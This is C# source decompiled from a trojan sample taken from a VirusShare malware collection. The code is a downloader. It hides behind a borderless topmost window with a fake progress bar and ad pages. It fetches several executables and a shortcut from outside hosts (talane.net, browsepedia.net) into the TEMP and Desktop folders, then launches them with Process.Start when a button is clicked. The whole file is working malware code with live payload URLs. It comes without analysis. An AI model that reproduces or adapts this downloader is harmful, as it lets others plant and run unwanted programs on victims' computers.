// Decompiled with JetBrains decompiler
// Type: uksjbuhpihpaupoju9.screenstart
// Assembly: uksjbuhpihpaupoju9, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D0E7EC0D-6DB0-49D1-A595-C2842328BC4D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00039-msil\Trojan-Ransom.Win32.Foreign.adch-fcbd87783ed93015c31c4b53c60d58fa94850acc202c3f6827c892c08d16e761.exe.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace uksjbuhpihpaupoju9
{
  public class screenstart : Form
  {
    public string pag01_220213 = "http://browsepedia.net/130213s/130213i.htm";
    private bool pag01complete_220213;
    private bool pag01final_220213;
    private int last_arr;
    private List<Array> lista = new List<Array>();
    private int run_prog;
    private string tempopro_220213 = "";
    private string tempopar_220213 = "";
    private string tempoway_220213 = "";
    private int loadedsite_220213;
    private string pagesite_220213 = "";
    private IContainer components;
    private WebBrowser navegador_1;
    private Panel painel_inicial;
    private Label lb_carregando;
    private ProgressBar barra_progresso;
    private System.Windows.Forms.Timer clock;
    private BackgroundWorker worker_fundo;
    private System.Windows.Forms.Timer valida_NAV;
    private Panel panel1;
    private Label lb_porc;
    private Button button1;

    public screenstart() => this.InitializeComponent();

    private void janelainicial(object sender, EventArgs e)
    {
      this.clock.Enabled = true;
      this.lista.Add((Array) new string[6]
      {
        "http://talane.net/130213d/fun220213.exe",
        "",
        "0",
        "",
        "TEMP",
        "http://browsepedia.net/130213s/130213c.htm"
      });
      this.lista.Add((Array) new string[6]
      {
        "http://talane.net/130213d/dply.exe",
        "",
        "0",
        "",
        "TEMP",
        ""
      });
      this.lista.Add((Array) new string[6]
      {
        "http://talane.net/130213d/240213d_4.exe",
        "",
        "1",
        "",
        "TEMP",
        "http://browsepedia.net/130213s/130213c2.htm"
      });
      this.lista.Add((Array) new string[6]
      {
        "http://talane.net/130213d/Baixar-com-Velocidade-Premium.url",
        "",
        "0",
        "",
        "DESKTOP",
        ""
      });
    }

    private void tela_inicial_FormClosed(object sender, FormClosedEventArgs e) => Environment.Exit(1);

    private void clock_Tick(object sender, EventArgs e)
    {
      this.navegador_1.Url = new Uri(this.pag01_220213);
      this.worker_fundo.RunWorkerAsync();
      this.clock.Enabled = false;
    }

    private void bg_w_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      int runProg = this.run_prog;
      if (this.pagesite_220213.Length > 0)
        this.navegador_1.Url = new Uri(this.pagesite_220213);
      if (this.last_arr == this.lista.Count)
        this.panel1.Visible = true;
      else
        this.worker_fundo.RunWorkerAsync();
    }

    private void bg_w_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      this.barra_progresso.Value = e.ProgressPercentage;
      this.lb_porc.Text = e.ProgressPercentage.ToString() + "%";
    }

    private void bg_w_DoWork(object sender, DoWorkEventArgs e)
    {
      string uriString = "";
      string str1 = "";
      string str2 = "";
      int num1 = 0;
      foreach (string[] strArray1 in this.lista)
      {
        if (num1 == this.last_arr)
        {
          uriString = strArray1[0];
          if (strArray1[1].Length == 0)
          {
            string[] strArray2 = strArray1[0].Split('/');
            str2 = strArray2[strArray2.Length - 1];
          }
          else
            str2 = strArray1[1];
          this.run_prog = int.Parse(strArray1[2]);
          this.tempopar_220213 = strArray1[3];
          str1 = strArray1[4];
          this.pagesite_220213 = strArray1[5];
          ++this.last_arr;
          break;
        }
        ++num1;
      }
      if (uriString.Length <= 0)
        return;
      if (str1.Equals("TEMP"))
        str1 = Environment.GetEnvironmentVariable("TEMP") + "\\";
      if (str1.Equals("DESKTOP"))
        str1 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
      this.tempoway_220213 = str1;
      this.tempopro_220213 = str2;
      string path = str1 + str2;
      HttpWebResponse response = (HttpWebResponse) WebRequest.Create(new Uri(uriString)).GetResponse();
      response.Close();
      long contentLength = response.ContentLength;
      long num2 = 0;
      using (WebClient webClient = new WebClient())
      {
        using (Stream stream1 = webClient.OpenRead(new Uri(uriString)))
        {
          using (Stream stream2 = (Stream) new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[contentLength];
            int count;
            while ((count = stream1.Read(buffer, 0, buffer.Length)) > 0)
            {
              stream2.Write(buffer, 0, count);
              num2 += (long) count;
              this.worker_fundo.ReportProgress((int) ((double) num2 / (double) buffer.Length * 100.0));
            }
            stream2.Close();
          }
          stream1.Close();
        }
      }
    }

    private void navegador_1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
      if (!this.pag01final_220213)
        return;
      Application.Exit();
    }

    private void navegador_2_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void check_IE_Tick(object sender, EventArgs e)
    {
      if (!this.pag01complete_220213)
        return;
      Environment.Exit(1);
    }

    private void button2_Click(object sender, EventArgs e)
    {
      foreach (string[] strArray1 in this.lista)
      {
        string str1;
        if (strArray1[1].Length == 0)
        {
          string[] strArray2 = strArray1[0].Split('/');
          str1 = strArray2[strArray2.Length - 1];
        }
        else
          str1 = strArray1[1];
        string str2 = strArray1[4];
        if (str2.Length > 0)
        {
          if (str2.Equals("TEMP"))
            str2 = Environment.GetEnvironmentVariable("TEMP") + "\\";
          if (str2.Equals("DESKTOP"))
            str2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
          System.IO.File.Delete(str2 + str1);
        }
      }
      Application.Exit();
    }

    private void button1_Click(object sender, EventArgs e)
    {
      foreach (string[] strArray1 in this.lista)
      {
        string str1;
        if (strArray1[1].Length == 0)
        {
          string[] strArray2 = strArray1[0].Split('/');
          str1 = strArray2[strArray2.Length - 1];
        }
        else
          str1 = strArray1[1];
        string arguments = strArray1[3];
        string str2 = strArray1[4];
        int num = int.Parse(strArray1[2]);
        if (str2.Length > 0 && num == 1)
        {
          if (str2.Equals("TEMP"))
            str2 = Environment.GetEnvironmentVariable("TEMP") + "\\";
          if (str2.Equals("DESKTOP"))
            str2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Desktop\\";
          Process.Start(str2 + str1, arguments);
        }
      }
      Application.Exit();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (screenstart));
      this.navegador_1 = new WebBrowser();
      this.painel_inicial = new Panel();
      this.lb_porc = new Label();
      this.panel1 = new Panel();
      this.lb_carregando = new Label();
      this.barra_progresso = new ProgressBar();
      this.clock = new System.Windows.Forms.Timer(this.components);
      this.worker_fundo = new BackgroundWorker();
      this.valida_NAV = new System.Windows.Forms.Timer(this.components);
      this.button1 = new Button();
      this.painel_inicial.SuspendLayout();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.navegador_1.Location = new Point(27, 95);
      this.navegador_1.MinimumSize = new Size(20, 20);
      this.navegador_1.Name = "navegador_1";
      this.navegador_1.Size = new Size(326, 250);
      this.navegador_1.TabIndex = 10;
      this.navegador_1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.navegador_1_DocumentCompleted);
      this.painel_inicial.BorderStyle = BorderStyle.FixedSingle;
      this.painel_inicial.Controls.Add((Control) this.lb_porc);
      this.painel_inicial.Controls.Add((Control) this.panel1);
      this.painel_inicial.Controls.Add((Control) this.lb_carregando);
      this.painel_inicial.Controls.Add((Control) this.barra_progresso);
      this.painel_inicial.Location = new Point(3, 6);
      this.painel_inicial.Name = "painel_inicial";
      this.painel_inicial.Size = new Size(347, 62);
      this.painel_inicial.TabIndex = 9;
      this.lb_porc.AutoSize = true;
      this.lb_porc.Location = new Point(312, 32);
      this.lb_porc.Name = "lb_porc";
      this.lb_porc.Size = new Size(0, 13);
      this.lb_porc.TabIndex = 9;
      this.panel1.Controls.Add((Control) this.button1);
      this.panel1.Location = new Point(4, 4);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(336, 53);
      this.panel1.TabIndex = 8;
      this.panel1.Visible = false;
      this.lb_carregando.Location = new Point(8, 9);
      this.lb_carregando.Name = "lb_carregando";
      this.lb_carregando.Size = new Size(102, 13);
      this.lb_carregando.TabIndex = 7;
      this.barra_progresso.Location = new Point(8, 28);
      this.barra_progresso.Name = "barra_progresso";
      this.barra_progresso.Size = new Size(301, 23);
      this.barra_progresso.TabIndex = 3;
      this.clock.Tick += new EventHandler(this.clock_Tick);
      this.worker_fundo.WorkerReportsProgress = true;
      this.worker_fundo.DoWork += new DoWorkEventHandler(this.bg_w_DoWork);
      this.worker_fundo.ProgressChanged += new ProgressChangedEventHandler(this.bg_w_ProgressChanged);
      this.worker_fundo.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.bg_w_RunWorkerCompleted);
      this.valida_NAV.Enabled = true;
      this.valida_NAV.Tick += new EventHandler(this.check_IE_Tick);
      this.button1.Image = (Image) componentResourceManager.GetObject("button1.Image");
      this.button1.Location = new Point(92, 5);
      this.button1.Name = "button1";
      this.button1.Size = new Size(158, 42);
      this.button1.TabIndex = 7;
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(356, 75);
      this.Controls.Add((Control) this.navegador_1);
      this.Controls.Add((Control) this.painel_inicial);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (screenstart);
      this.Opacity = 0.9;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Form1";
      this.TopMost = true;
      this.FormClosed += new FormClosedEventHandler(this.tela_inicial_FormClosed);
      this.Load += new EventHandler(this.janelainicial);
      this.painel_inicial.ResumeLayout(false);
      this.painel_inicial.PerformLayout();
      this.panel1.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
